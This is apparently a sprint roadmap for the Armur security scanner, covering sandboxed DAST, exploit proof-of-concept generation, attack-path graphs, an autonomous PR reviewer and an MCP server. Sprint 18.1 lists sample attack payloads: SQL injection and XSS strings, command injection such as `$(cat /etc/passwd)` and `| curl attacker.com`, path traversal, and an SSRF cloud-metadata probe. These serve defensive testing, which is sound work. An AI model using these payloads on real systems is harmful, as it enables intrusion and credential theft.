- [ ] Output: structured `TechProfile` JSON used by the DAST sandbox engine (Sprint 17)
- [ ] Fallback when no AI available: heuristic-based detection from file extensions and manifests (already exists, just less smart about framework/port detection)

#### 16.5 `armur explain` — Plain-English Finding Explanation

- [ ] `armur explain <finding-id>` CLI command
- [ ] Uses the AI provider to generate a targeted explanation:
  - **What it is**: one sentence description of the vulnerability class
  - **Why it matters**: real-world impact and exploitability
  - **Attack scenario**: short realistic attack walkthrough for this specific code context
  - **How to fix**: concrete code change recommendation
- [ ] Include the finding's code snippet and file context in the prompt for specificity
- [ ] Stream the response to the terminal in real-time (SSE from Claude API)
- [ ] Cache explanations locally in SQLite (`~/.armur/history.db`) — reuse for same finding ID
- [ ] `armur explain --all --severity high` — bulk explain all HIGH findings in the last scan

#### 16.6 `armur fix` — AI-Generated Code Patches

- [ ] `armur fix <finding-id>` CLI command
- [ ] Read the affected file from disk, extract ±10 lines of context around the finding's line
- [ ] Send to AI provider: `Given this vulnerability in <language>, generate a minimal code patch that fixes only the reported issue without changing functionality`
- [ ] Display the diff in the terminal (colored unified diff format using `github.com/pmezard/go-difflib`)
- [ ] `armur fix --apply <finding-id>` — apply the patch directly to the file (with backup to `<file>.armur.bak`)
- [ ] `armur fix --pr <finding-id>` — apply the patch, stage the change, and create a draft GitHub PR
- [ ] Batch mode: `armur fix --all --severity critical --apply` — apply AI fixes for all CRITICAL findings (requires explicit confirmation)

#### 16.7 False Positive Reduction via LLM

- [ ] After a scan completes, run MEDIUM-severity findings through an LLM filter:
  - Input: finding details + 15 lines of code context
  - Prompt: "Is this a genuine security finding or a false positive? Rate confidence 0-100."
  - Findings with LLM confidence < 40: mark as `low_confidence`, hide by default (show with `--show-low-confidence`)
- [ ] Track false positive rates per tool over time; surface "this tool has 40% FP rate for this rule"
- [ ] Configurable: `armur.yml: ai.false-positive-filter: true` (default: false — requires API key)

#### 16.8 Vulnerability Chaining Detection

- [ ] Detect cases where multiple LOW/MEDIUM findings together form a higher-risk attack chain:
  - Example: SSRF (MEDIUM) + credentials in env var (MEDIUM) → Remote credential theft (HIGH/CRITICAL)
  - Example: Path traversal (MEDIUM) + file read in same function → file disclosure (HIGH)
- [ ] Implement a rule engine in `internal/analysis/chains.go` with hand-crafted chaining rules
- [ ] LLM augmentation: send clusters of findings from the same file to the AI provider for chain analysis
- [ ] Display chains as a separate `vulnerability_chain` category in results

#### 16.9 Natural Language Scan Configuration

- [ ] `armur run --ask "scan only for SQL injection and hardcoded credentials"` flag
- [ ] Parse the natural language instruction with AI provider → convert to a structured `.armur.yml` fragment
- [ ] Apply the generated config for the current scan run only (do not persist)

#### 16.10 `--offline` Mode & Local Vulnerability Database

- [ ] `--offline` global flag: when set, Armur makes zero external network calls
  - No AI API calls (use Ollama if running; otherwise AI features disabled)
  - No OSV API queries (use local vulnerability database cache if available)
  - No badge server pings
  - No telemetry (already off by default; this makes it explicit)
  - Scan still runs fully; only AI features and online lookups are disabled
- [ ] `.armur.yml: offline: true` — project-level offline enforcement
- [ ] `ARMUR_OFFLINE=true` env var — enforcement for CI environments without outbound internet
- [ ] `armur db update` — download the OSV vulnerability database to `~/.armur/vuln-db/` (SQLite)
  - Downloads all OSV advisories for Go, npm, PyPI, crates.io, Maven, RubyGems, etc.
  - Database size: ~300MB for all ecosystems; supports incremental updates
- [ ] `armur db update --ecosystem go,npm` — update only specific ecosystems
- [ ] SCA checks in `--offline` mode use the local DB instead of the OSV API
- [ ] Show DB freshness warning if local DB is > 24h old when running SCA scans
- [ ] Auto-update DB in the background (daily, configurable) when online
- [ ] Zero telemetry by default — Armur never phones home
- [ ] `--privacy-audit` flag: print a list of every network call that *would* be made during a scan

---

### Sprint 17 — Sandboxed DAST: Intelligent Runtime Testing

Full-blown DAST that goes far beyond "scan a URL." Armur auto-detects the tech stack, creates an
isolated sandbox, builds and runs the application, waits for it to be healthy, then hammers it
with dynamic security tests. This is the feature that makes Armur a true security agent.

#### 17.1 Sandbox Environment Engine

- [ ] Create `internal/sandbox/sandbox.go` — manages isolated execution environments:
  ```go
  type Sandbox struct {
      ID          string
      ProjectPath string
      TechProfile TechProfile
      ContainerID string
      Port        int
      BaseURL     string
      Status      string  // "creating", "building", "running", "healthy", "failed", "destroyed"
  }

  func Create(ctx context.Context, projectPath string, profile TechProfile) (*Sandbox, error)
  func (s *Sandbox) Build(ctx context.Context) error
  func (s *Sandbox) Start(ctx context.Context) error
  func (s *Sandbox) WaitHealthy(ctx context.Context, timeout time.Duration) error
  func (s *Sandbox) BaseURL() string
  func (s *Sandbox) Destroy(ctx context.Context) error
  ```
- [ ] Sandbox uses Docker to isolate the application:
  - Auto-generate a `Dockerfile` if one doesn't exist (using AI tech detection results)
  - Build the application inside the container
  - Run it with network isolation (only accessible from the host)
  - Map the application port to a random available host port
- [ ] For Docker Compose projects: use `docker compose up` instead of building a single container
- [ ] Resource limits: CPU (2 cores max), memory (2GB max), disk (5GB max), network (no external access)
- [ ] Timeout: sandbox auto-destroys after 10 minutes (configurable via `dast.sandbox_timeout` in `.armur.yml`)
- [ ] Cleanup: always destroy sandbox on completion, cancellation, or error (defer-based)

#### 17.2 Intelligent Dockerfile Generation

- [ ] When no Dockerfile exists, use the `TechProfile` from Sprint 16.4 to generate one:
  - **Go**: `golang:1.22-alpine` → `go build` → `scratch` or `alpine` runtime
  - **Python (Flask/FastAPI/Django)**: `python:3.12-slim` → `pip install -r requirements.txt` → `CMD`
  - **Node.js (Express/Next.js/Nest)**: `node:20-slim` → `npm install` → `npm start`
  - **Java (Spring Boot)**: `maven:3.9-eclipse-temurin-21` → `mvn package` → `openjdk:21-jre-slim`
  - **Ruby (Rails)**: `ruby:3.3-slim` → `bundle install` → `rails server`
  - **Rust**: `rust:1.76` → `cargo build --release` → `debian:bookworm-slim`
  - **PHP (Laravel)**: `php:8.3-fpm` → `composer install` → with nginx sidecar
- [ ] AI-enhanced Dockerfile generation: send project structure to AI provider and ask for optimal Dockerfile
- [ ] If AI is not available: use template-based generation from the detected framework
- [ ] Store generated Dockerfile in `~/.armur/sandbox/<sandbox-id>/Dockerfile` (not in the project)
- [ ] Handle projects with `docker-compose.yml`: parse it, identify the main service, use existing compose

#### 17.3 Application Health Detection

- [ ] After starting the sandbox, probe for application readiness:
  1. TCP connect to the mapped port (retry every 500ms, max 60s)
  2. HTTP GET `/` — check for any non-connection-error response
  3. HTTP GET common health endpoints: `/health`, `/healthz`, `/api/health`, `/ping`, `/ready`
  4. If health check path detected in code (via grep/AI): use that specific endpoint
- [ ] Parse application stdout for startup messages: "Listening on port", "Server started", "Ready to accept connections"
- [ ] If the app fails to start: capture stdout/stderr, report as a finding:
  "Application failed to start in sandbox — DAST could not be performed. Build error: [...]"
- [ ] If AI is available: analyze the build/startup failure and suggest a fix

#### 17.4 Dynamic Security Testing Suite

- [ ] Once the app is healthy, run a layered DAST test suite:

  **Layer 1 — Passive Discovery (always runs, <30s):**
  - Spider/crawl the application from the root URL using a headless crawler
  - Discover all routes, forms, API endpoints, authentication pages
  - Detect technology headers (X-Powered-By, Server, framework fingerprints)
  - Check security headers: HSTS, CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy
  - Check cookie attributes: HttpOnly, Secure, SameSite
  - Check CORS configuration: open `*` origins, credential leaks

  **Layer 2 — Active Probing (opt-in or auto for non-prod, ~2-5min):**
  - SQL injection probes on all detected input parameters (forms, query params, JSON bodies)
  - XSS probes: reflected and stored XSS payloads on all input points
  - Command injection probes on parameters that could reach exec paths
  - Path traversal probes (`../../etc/passwd`) on file-related parameters
  - SSRF probes: inject internal IP addresses in URL-accepting parameters
  - Authentication bypass: try accessing protected endpoints without auth headers
  - IDOR probes: iterate sequential IDs on resource endpoints
  - Rate limiting check: send 100 rapid requests to login endpoint
  - Error disclosure: trigger errors and check for stack traces / debug info in responses

  **Layer 3 — Known CVE Exploitation (via Nuclei, ~1-2min):**
  - Run Nuclei against the sandbox URL with templates matching the detected tech stack
  - Focus on: framework CVEs, exposed admin panels, default credentials, misconfiguration
  - `nuclei -u <sandbox-url> -t cves/ -t exposed-panels/ -t misconfigurations/ -severity medium,high,critical -j`

  **Layer 4 — ZAP Deep Scan (opt-in, ~5-10min):**
  - If ZAP is available and depth=deep: run ZAP active scan
  - `docker run owasp/zap2docker-stable zap-full-scan.py -t <sandbox-url> -J results.json`
  - Merge ZAP findings with Armur findings, deduplicating by endpoint+vulnerability type

- [ ] All DAST findings tagged with `Finding.Source = "dast"` and `Finding.Confirmed = true`
- [ ] DAST findings include the HTTP request/response that triggered the vulnerability

#### 17.5 CLI Integration

- [ ] `armur dast <path>` — run DAST against a local project:
  1. Detect tech stack (AI or heuristic)
  2. Create sandbox
  3. Build and start application
  4. Run DAST test suite
  5. Destroy sandbox
  6. Display findings
- [ ] `armur scan <path> --dast` — add DAST to a regular SAST scan (runs SAST first, then DAST)
- [ ] `armur scan <path> --full-agent` — SAST + SCA + DAST + Exploit Simulation (Sprint 18)
- [ ] `armur dast --url <url>` — run DAST against an already-running service (skip sandbox creation)
- [ ] Progress display during DAST: show sandbox status, test layer progress, findings as they arrive
- [ ] `.armur.yml` DAST configuration:
  ```yaml
  dast:
    enabled: true
    auto_sandbox: true        # auto-create sandbox (false = require --url)
    layers: [passive, active, nuclei]  # which layers to run (default: all except zap)
    sandbox_timeout: 600      # seconds before sandbox auto-destroys
    port_hint: 8080           # hint for which port the app listens on
    env:                      # environment variables for the sandbox
      DATABASE_URL: "sqlite:///tmp/test.db"
      SECRET_KEY: "test-secret-for-dast"
    auth:                     # authentication for protected endpoints
      type: bearer            # bearer | basic | form | cookie
      token: "${DAST_TOKEN}"  # use env var for secrets
    exclude_paths:            # don't test these paths
      - /admin/delete-all
      - /api/v1/dangerous-endpoint
  ```

---

### Sprint 18 — Exploit Simulation & Proof-of-Concept Engine

Move beyond "we found a vulnerability" to "here's exactly how an attacker exploits it."
Armur generates safe, sandboxed exploit proof-of-concepts that confirm SAST findings are real
and show developers the actual impact. This transforms theoretical findings into visceral,
undeniable evidence.

#### 18.1 Exploit Generation Engine

- [ ] Create `internal/exploit/generator.go` — generates PoC exploits from findings:
  ```go
  type ExploitPoC struct {
      FindingID   string   `json:"finding_id"`
      Type        string   `json:"type"`        // "sql_injection", "xss", "rce", etc.
      Description string   `json:"description"` // what the exploit does
      Steps       []Step   `json:"steps"`       // ordered attack steps
      Payload     string   `json:"payload"`     // the actual exploit payload
      HTTPRequest *HTTPReq `json:"http_request,omitempty"` // for web exploits
      Script      string   `json:"script"`      // executable PoC script (bash/python)
      Impact      string   `json:"impact"`      // what an attacker gains
      Severity    string   `json:"severity"`    // confirmed severity after simulation
  }
  ```
- [ ] **Template-based exploit generation** (works without AI):
  - SQL injection: generate payloads for the specific database type detected (PostgreSQL, MySQL, SQLite)
    - Union-based extraction: `' UNION SELECT username, password FROM users --`
    - Boolean-based blind: `' AND 1=1 --` vs `' AND 1=2 --`
    - Time-based blind: `'; WAITFOR DELAY '0:0:5' --`
  - XSS: generate context-aware payloads (HTML context, attribute context, JavaScript context)
    - Reflected: `<script>alert(document.cookie)</script>`
    - DOM-based: `javascript:alert(1)` in URL fragments
  - Command injection: generate OS-specific payloads (Linux/Windows)
    - `; id`, `` `whoami` ``, `$(cat /etc/passwd)`, `| curl attacker.com`
  - Path traversal: `../../etc/passwd`, `..\..\windows\system32\drivers\etc\hosts`
  - SSRF: `http://169.254.169.254/latest/meta-data/` (AWS metadata)
  - Deserialization: language-specific gadget chains
  - Auth bypass: JWT none algorithm, SQL injection in login, default credentials

- [ ] **AI-enhanced exploit generation** (when AI provider available):
  - Send the finding context (code snippet, endpoint, parameter) to the AI
  - Prompt: "Generate a safe, sandboxed proof-of-concept exploit for this [vulnerability type] in [language/framework]. The PoC should demonstrate impact without causing real damage. Include the exact HTTP request or code to reproduce."
  - AI generates more sophisticated, context-aware exploits than templates
  - Validate AI output: ensure it doesn't contain destructive payloads (no `rm -rf`, no actual data exfiltration to external URLs)

#### 18.2 Safe Exploit Execution

- [ ] Exploits ONLY run inside the sandbox from Sprint 17 (never against production)
- [ ] Create `internal/exploit/runner.go` — executes PoCs safely:
  ```go
  type ExploitResult struct {
      PoCID       string `json:"poc_id"`
      Success     bool   `json:"success"`      // did the exploit work?
      Evidence    string `json:"evidence"`      // what happened (response body, output, etc.)
      Screenshot  string `json:"screenshot"`    // base64 screenshot if web-based
      HTTPLog     []HTTPExchange `json:"http_log"` // full request/response log
      Severity    string `json:"confirmed_severity"` // severity after confirmation
  }
  ```
- [ ] Execution isolation:
  - All exploit HTTP requests go only to the sandbox URL (enforce via URL validation)
  - No network access to external hosts from exploit scripts
  - Exploit scripts run inside a separate container (not the same as the app sandbox)
  - 30-second timeout per exploit attempt
  - Capture all HTTP traffic (request + response) as evidence
- [ ] Severity escalation: if a MEDIUM SAST finding is confirmed exploitable → escalate to HIGH or CRITICAL
- [ ] Severity downgrade: if exploit fails → add `Finding.ExploitResult = "not_exploitable"` (doesn't remove the finding, but lowers priority)

#### 18.3 Exploit Report & Evidence

- [ ] Each confirmed exploit generates an evidence package:
  - The exact HTTP request(s) that triggered the vulnerability
  - The server response proving exploitation (e.g., extracted data, error message, timing difference)
  - Step-by-step reproduction instructions
  - Remediation: specific code change to fix the vulnerability
- [ ] Display in CLI:
  ```
  ┌─────────────────────────────────────────────────────┐
  │  [CONFIRMED] SQL Injection — api/handlers.go:42     │
  │  Severity: CRITICAL (confirmed via exploit)         │
  ├─────────────────────────────────────────────────────┤
  │  Exploit: Union-based SQL injection via 'id' param  │
  │  Request: POST /api/users?id=1' UNION SELECT...     │
  │  Impact:  Full database read access                 │
  │  Fix:     Use parameterized query (see suggestion)  │
  └─────────────────────────────────────────────────────┘
  ```
- [ ] HTML report includes exploit evidence as collapsible sections with syntax-highlighted HTTP logs
- [ ] `armur exploit <finding-id>` — generate and run an exploit for a specific finding

#### 18.4 Exploit Simulation Modes

- [ ] **Auto mode** (default in `full_agent`): automatically attempt exploits for all HIGH/CRITICAL SAST findings that have DAST-reachable endpoints
- [ ] **Manual mode**: `armur exploit <finding-id>` — run a specific exploit interactively
- [ ] **Dry-run mode**: `armur exploit --dry-run` — generate exploit PoCs and show what would be attempted, but don't execute them
- [ ] **CI mode**: `armur scan --full-agent --exploit-confirm` — run exploits in CI pipeline, fail on confirmed exploits
- [ ] `.armur.yml` configuration:
  ```yaml
  exploit:
    enabled: false            # opt-in (default off for safety)
    auto_for_severity: high   # auto-exploit findings at this severity or above
    max_attempts: 5           # max exploit attempts per finding
    timeout_per_exploit: 30   # seconds
    dry_run: false            # generate but don't execute
  ```

---

### Sprint 19 — Attack Path Analysis & Visualization

Individual findings are noise. Attack paths are signal. This sprint connects findings into attack
graphs that show developers: "An attacker starts here, chains these 3 issues, and ends up with
full database access." This is what converts a vulnerability report into a story that drives action.

#### 19.1 Attack Graph Construction

- [ ] Create `internal/attackpath/graph.go`:
  ```go
  type AttackGraph struct {
      Nodes []AttackNode `json:"nodes"`
      Edges []AttackEdge `json:"edges"`
      Paths []AttackPath `json:"paths"`
  }

  type AttackNode struct {
      ID        string   `json:"id"`
      FindingID string   `json:"finding_id,omitempty"` // links to a Finding
      Type      string   `json:"type"`     // "entry_point", "vulnerability", "privilege", "asset"
      Label     string   `json:"label"`
      Severity  string   `json:"severity"`
  }

  type AttackEdge struct {
      From      string `json:"from"`
      To        string `json:"to"`
      Label     string `json:"label"`   // "exploits", "leads_to", "escalates_to", "accesses"
      Technique string `json:"technique"` // MITRE ATT&CK technique ID if applicable
  }

  type AttackPath struct {
      ID          string   `json:"id"`
      Name        string   `json:"name"`        // "Unauthenticated DB Access via SQLi"
      Severity    string   `json:"severity"`     // highest severity in the path
      NodeIDs     []string `json:"node_ids"`     // ordered path through the graph
      Impact      string   `json:"impact"`       // what the attacker achieves
      Likelihood  string   `json:"likelihood"`   // high/medium/low based on complexity
      Description string   `json:"description"`  // narrative description
  }
  ```
- [ ] **Entry point detection**: identify attack surface from the code:
  - HTTP endpoints (parsed from router definitions: Gin, Express, Flask, Spring, etc.)
  - CLI argument handlers
  - File upload handlers
  - WebSocket handlers
  - Message queue consumers
  - Cron jobs with external input
- [ ] **Vulnerability chaining rules** (hand-crafted + AI-augmented):
  - SSRF + cloud metadata endpoint → credential theft → lateral movement
  - SQL injection + admin table → authentication bypass → full data access
  - XSS + session cookie without HttpOnly → session hijacking → account takeover
  - Path traversal + config file read → credential disclosure → privilege escalation
  - Insecure deserialization + network access → remote code execution
  - Weak JWT + no audience validation → token forgery → impersonation
  - Command injection + network access → reverse shell → full system compromise
  - Dependency vulnerability (known RCE CVE) + internet-facing service → pre-auth RCE
- [ ] Build the graph automatically after SAST + DAST results are collected
- [ ] When AI is available: send findings to AI for additional chain discovery that rules can't catch

#### 19.2 Attack Path Scoring

- [ ] Score each attack path based on:
  ```
  path_score = base_impact_score
             × chain_complexity_factor    (fewer steps = higher score)
             × confirmation_multiplier    (2.0 if any step is DAST-confirmed, 1.0 otherwise)
             × exposure_factor            (1.5 if entry point is internet-facing, 1.0 if internal)
             × authentication_factor      (1.5 if no auth required, 1.0 if auth required)
  ```
- [ ] Rank paths by score; present the top 5 as the "critical attack paths"
- [ ] Add `Finding.AttackPaths []string` — list of attack path IDs that include this finding
- [ ] Findings that appear in multiple attack paths get a priority boost

#### 19.3 Visualization: Mermaid Diagrams

- [ ] Generate Mermaid flowchart syntax for each attack path:
  ```mermaid
  graph LR
    A[Internet User] -->|POST /api/search| B[Search Endpoint]
    B -->|SQLi in 'query' param| C[SQL Injection]
    C -->|UNION SELECT| D[Database Read Access]
    D -->|Extract users table| E[Credential Theft]
    E -->|Admin password| F[Admin Panel Access]
    style C fill:#ff4444
    style E fill:#ff4444
    style F fill:#ff0000
  ```
- [ ] Include Mermaid diagrams in:
  - HTML reports (rendered via Mermaid.js CDN or inline SVG)
  - Markdown reports (raw Mermaid code blocks — GitHub renders them natively)
  - CLI output (as ASCII-art graph using box-drawing characters)
- [ ] `armur attack-paths --task <id>` — display attack paths with ASCII visualization
- [ ] `armur attack-paths --task <id> --format mermaid` — output raw Mermaid for pasting into docs

#### 19.4 Interactive Attack Path Browser (TUI)

- [ ] Extend the Bubbletea TUI (Sprint 7) with an "Attack Paths" tab:
  - Left panel: list of attack paths sorted by score, with severity badge
  - Right panel: ASCII graph visualization of the selected path
  - Press Enter on a path → expand to show each node's finding details
  - Press `m` → copy Mermaid diagram to clipboard
  - Press `e` → export attack path as SVG (render Mermaid locally if `mmdc` is installed)
- [ ] Summary card includes attack path count: "3 critical attack paths identified"

#### 19.5 Attack Path in CI/CD

- [ ] `--fail-on-attack-path` flag: fail the CI build if any attack path with score above threshold exists
- [ ] Attack paths included in SARIF output as related locations (GitHub Code Scanning shows the chain)
- [ ] PR comment (when GitHub App is integrated) includes the top attack path:
  ```
  ## Attack Path Detected
  **Unauthenticated Database Access** (Critical)
  Internet → POST /api/search → SQL Injection (search.go:42) → Database Read → Credential Theft

  This PR introduces a SQL injection that enables full database access without authentication.
  ```

---

### Sprint 20 — PR Security Agent: Autonomous Code Review

The crown jewel. Armur acts as an autonomous security reviewer on every pull request. It reads
the diff, runs SAST on the changes, spins up a sandbox for DAST, simulates exploits, maps attack
paths, and posts a comprehensive security review — all without any human intervention. This is
what "Personal Security Agent" means in practice.

#### 20.1 PR Review Engine

- [ ] Create `internal/agent/pr_review.go` — the PR review orchestrator:
  ```go
  type PRReview struct {
      PRURL       string
      BaseBranch  string
      HeadBranch  string
      ChangedFiles []string
      SASTFindings []Finding
      DASTFindings []Finding
      ExploitResults []ExploitResult
      AttackPaths  []AttackPath
      AICommentary string     // AI-generated review narrative
      Verdict      string     // "approve", "request_changes", "comment"
  }

  func ReviewPR(ctx context.Context, prURL string, opts ReviewOpts) (*PRReview, error)
  ```
- [ ] Review pipeline:
  1. **Fetch PR diff**: clone repo, checkout PR branch, compute changed files vs base
  2. **SAST scan**: run full SAST on changed files only (diff mode)
  3. **SCA check**: check if any new dependencies were added; run vulnerability check on new deps only
  4. **Secrets scan**: scan the diff for newly introduced secrets (not existing ones)
  5. **DAST** (if applicable): if the PR changes API endpoints or adds new routes:
     - Build sandbox from the PR branch
     - Run DAST against the sandbox
     - Focus tests on endpoints modified in the PR
  6. **Exploit simulation** (if enabled): attempt exploits for any HIGH/CRITICAL findings
  7. **Attack path analysis**: check if the PR introduces new attack paths or extends existing ones
  8. **AI review narrative**: use AI provider to generate a developer-friendly review summary
  9. **Verdict determination**: auto-approve if no HIGH/CRITICAL findings; request changes otherwise

#### 20.2 GitHub PR Integration

- [ ] `armur review <pr-url>` CLI command:
  - Accepts GitHub PR URL: `armur review https://github.com/owner/repo/pull/123`
  - Runs the full review pipeline locally
  - Prints results to terminal
  - Optionally posts review comment: `armur review <pr-url> --post-comment`
- [ ] GitHub App webhook handler (extends Sprint 23):
  - On `pull_request.opened` / `pull_request.synchronize`: automatically trigger review
  - Post review as a GitHub PR review (not just a comment):
    - Inline comments on specific lines where findings are located
    - Review summary at the top with severity table + attack paths
    - Review verdict: "Approve" / "Request Changes" based on findings
- [ ] PR review comment format:
  ```markdown
  ## Armur Security Review

  **Verdict: Request Changes** — 2 critical issues found

  ### Summary
  | Category | New Findings |
  |----------|-------------|
  | Critical | 1 |
  | High | 1 |
  | Medium | 3 |
  | Security Score | 42/100 (was 78/100 on main) |

  ### Critical Attack Path
  This PR introduces a SQL injection in `search.go:42` that enables unauthenticated
  database access. See inline comments for details.

  ### DAST Results
  Sandbox test passed for 12/15 endpoints
  3 endpoints vulnerable (see inline comments)

  ### What to Fix
  1. Use parameterized query in `search.go:42` (see suggested fix)
  2. Add input validation for `userID` parameter in `users.go:87`

  ---
  Reviewed by [Armur Security Agent](https://armur.ai)
  ```

#### 20.3 AI-Generated Review Narrative

- [ ] After all analysis is complete, send the full finding set to the AI provider:
  - Prompt: "You are a senior security engineer reviewing a pull request. Based on these findings, write a clear, actionable review. Focus on: what's most dangerous, why it matters, and exactly how to fix it. Be direct but not condescending."
  - Include: PR description, changed files summary, all findings with code context
  - The AI narrative is the "voice" of the security agent — it should sound like a helpful colleague
- [ ] Tone configuration in `.armur.yml`:
  ```yaml
  agent:
    review_tone: helpful     # helpful | strict | minimal
  ```
  - `helpful`: full explanations with fix suggestions (default)
  - `strict`: just the facts, no suggestions (for compliance-focused teams)
  - `minimal`: one-line per finding, verdict only

#### 20.4 Continuous PR Watching

- [ ] `armur agent --watch-prs` — continuously watch for new PRs and review them automatically
  - Requires GitHub App installation or a personal access token
  - Polls for new PRs every 60 seconds (configurable)
  - Reviews each new PR and update automatically
  - Runs as a background daemon: `armur agent --watch-prs --daemon`
- [ ] GitLab MR support: `armur agent --watch-mrs --gitlab-url <url> --token <token>`
- [ ] Status: show active watchers in `armur status`:
  ```
  Armur Security Agent — Active
  Watching: github.com/myorg/myapp (3 PRs reviewed today)
  Last review: PR #142 — 2 findings, Request Changes
  ```

#### 20.5 PR Review in CI/CD

- [ ] GitHub Actions integration:
  ```yaml
  - uses: armur-ai/armur-action@v2
    with:
      mode: pr-review
      post-review: true
      fail-on-severity: high
      dast: true
      exploit-simulation: false  # opt-in for CI
    env:
      ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
  ```
- [ ] GitLab CI template:
  ```yaml
  armur-review:
    image: armur/agent:latest
    script:
      - armur review --post-comment --fail-on-severity high
    rules:
      - if: $CI_PIPELINE_SOURCE == "merge_request_event"
  ```
- [ ] Support for all CI platforms from Sprint 25 (CircleCI, Jenkins, Azure DevOps, Bitbucket)

---

### Sprint 21 — MCP Server: Native AI Assistant Integration

The Model Context Protocol (MCP) is how AI coding assistants (Claude Code, Cursor, Windsurf, Claude
Desktop) call external tools. Armur as an MCP server means every developer using an AI assistant
gets Armur's scanning capabilities built directly into their coding workflow — zero extra steps.
This is the highest-leverage distribution play available right now.

#### 21.1 Core MCP Server Implementation

- [ ] Add `armur mcp` command — starts Armur as an MCP server over stdio (standard Claude Code transport)
- [ ] Use `github.com/mark3labs/mcp-go` as the MCP SDK (or implement the JSON-RPC 2.0 protocol directly)
- [ ] Implement MCP `initialize` handshake: declare server name `armur`, version, and capabilities
- [ ] Implement the following **MCP Tools** (functions Claude can call):

  **Scanning tools:**
  - `armur_scan_path` — scan a local file or directory
    - Input: `{ "path": string, "depth": "quick"|"deep" (optional) }`
    - Output: `{ "task_id": string, "findings": Finding[], "summary": ScanSummary }`
    - Runs in-process (no server required) for lowest latency
  - `armur_scan_code` — scan a code snippet without touching the filesystem (for inline use)
    - Input: `{ "code": string, "language": string, "filename": string (optional) }`
    - Output: `{ "findings": Finding[], "summary": ScanSummary }`
    - Writes to temp file, runs semgrep + language tools, returns findings, deletes temp file
  - `armur_scan_git_history` — scan git history for leaked secrets
    - Input: `{ "path": string, "depth": "full"|"recent" }` (`"recent"` = last 100 commits)
    - Output: `{ "findings": Finding[] }`

  **Finding intelligence tools:**
  - `armur_explain_finding` — explain a specific finding in plain English with attack scenario
    - Input: `{ "finding_id": string }` or `{ "finding": Finding }` (inline finding object)
    - Output: `{ "explanation": string, "attack_scenario": string, "remediation": string }`
  - `armur_fix_finding` — generate a code patch for a finding
    - Input: `{ "finding_id": string, "code_context": string (10 lines around the issue) }`
    - Output: `{ "patch": string (unified diff format), "explanation": string }`
  - `armur_check_dependency` — check if a specific package version has known vulnerabilities
    - Input: `{ "package": string, "version": string, "ecosystem": "npm"|"pip"|"go"|"cargo"|... }`
    - Output: `{ "vulnerabilities": Vulnerability[], "safe": bool, "fix_version": string }`

  **History & status tools:**
  - `armur_get_history` — get recent scan history for a path
    - Input: `{ "path": string (optional), "limit": int (default: 5) }`
    - Output: `{ "scans": ScanSummary[] }`
  - `armur_get_posture_score` — get the security posture score for a path
    - Input: `{ "path": string }`
    - Output: `{ "score": int, "grade": string, "breakdown": SeverityBreakdown }`

- [ ] Implement MCP **Resources** (data Claude can read without calling a tool):
  - `armur://findings/latest` — findings from the most recent scan of cwd
  - `armur://posture` — current posture score for cwd
  - `armur://history` — last 10 scan summaries
- [ ] Implement MCP **Prompts** (reusable prompt templates Claude can invoke):
  - `security_review` — "Review the following code for security vulnerabilities using Armur"
  - `fix_vulnerabilities` — "Fix all HIGH and CRITICAL vulnerabilities found by Armur in this file"
  - `explain_findings` — "Explain the Armur findings in this scan in developer-friendly language"

#### 21.2 Claude Code Integration

- [ ] Write `docs/integrations/claude-code.md` with step-by-step setup:
  ```json
  // Add to ~/.claude/settings.json (or use: claude mcp add armur -- armur mcp)
  {
    "mcpServers": {
      "armur": {
        "command": "armur",
        "args": ["mcp"],
        "env": { "ARMUR_API_KEY": "<your-key>" }
      }
    }
  }
  ```
- [ ] One-liner setup command: `armur setup claude-code` — writes the MCP config automatically to the correct Claude Code settings file
- [ ] Verify the integration: `armur setup claude-code --verify` — starts the MCP server, sends a test tool call, confirms it responds correctly
- [ ] Generate a `CLAUDE.md` snippet users can add to their project:
  ```markdown
  ## Security Policy
  This project uses Armur for security scanning. Before suggesting code changes:
  1. Use `armur_scan_code` to check new code for vulnerabilities
  2. Use `armur_check_dependency` before suggesting new package additions
  3. Address any HIGH or CRITICAL findings before finalizing suggestions
  4. Use `armur_explain_finding` if a finding needs clarification
  ```
- [ ] `armur setup claude-code --add-project-md` — appends the above snippet to `CLAUDE.md` in cwd

#### 21.3 Cursor Integration

- [ ] Write `docs/integrations/cursor.md` — Cursor supports MCP via the same `~/.cursor/mcp.json` config format
- [ ] `armur setup cursor` — writes MCP config to `~/.cursor/mcp.json`
- [ ] Cursor-specific prompt template: "When writing code, automatically check for security issues using Armur tools"
- [ ] Test the Cursor integration end-to-end; document known limitations (Cursor MCP differences)

#### 21.4 Windsurf Integration

- [ ] Write `docs/integrations/windsurf.md`
- [ ] `armur setup windsurf` — writes config to Windsurf's MCP config path
- [ ] Test and document Windsurf-specific behavior

#### 21.5 Claude Desktop Integration

- [ ] Write `docs/integrations/claude-desktop.md`
- [ ] `armur setup claude-desktop` — writes to `~/Library/Application Support/Claude/claude_desktop_config.json` (macOS) or equivalent on Windows/Linux
- [ ] Desktop-specific use case: scan repos you're reviewing without an editor open

#### 21.6 MCP Server Performance & Reliability

- [ ] `armur_scan_path` must complete in < 5 seconds for `depth: "quick"` on a typical project (use in-process mode)
- [ ] `armur_scan_code` must complete in < 2 seconds for a single file (semgrep only, no heavy tools)
- [ ] MCP server logs errors to stderr (visible in Claude Code's MCP debug output)
- [ ] Graceful error handling: if a tool is not installed, return a helpful error message instead of crashing
- [ ] Add integration tests that start the MCP server and call each tool via the MCP protocol

---

## Phase 4: Distribution (v2.5) — Sprints 22–27

Get Armur into every developer's hands. Homebrew, npm, pip, winget, Docker, GitHub App,
VS Code extension, CI/CD for every platform, onboarding, and analytics.

---

### Sprint 22 — Zero-Friction Distribution (Every Platform, One Command)

A tool is only as good as how easy it is to install. Every developer should be able to go from
"I heard about Armur" to running their first scan in under 60 seconds, on any platform.

#### 22.1 Homebrew (macOS & Linux — Primary Channel)

- [ ] Create `armur-ai/homebrew-tap` GitHub repository
- [ ] Write `Formula/armur.rb` Homebrew formula:
  - Downloads pre-built binary from GitHub Releases based on OS and arch
  - Installs to `/opt/homebrew/bin/armur` (Apple Silicon) or `/usr/local/bin/armur` (Intel)
  - Includes shell completion setup in the formula's `caveats` section
- [ ] Test formula installation on macOS (arm64 + x86_64) and Linux (x86_64)
- [ ] Publish: `brew install armur-ai/tap/armur`
- [ ] Submit to Homebrew Core (after meeting minimum formula requirements: 75+ stars, stable release)
- [ ] `armur update` self-update: `brew upgrade armur` under the hood when installed via Homebrew

#### 22.2 npm Global Package (JavaScript/TypeScript Developer Channel)

- [ ] Create `packages/armur-cli` npm package:
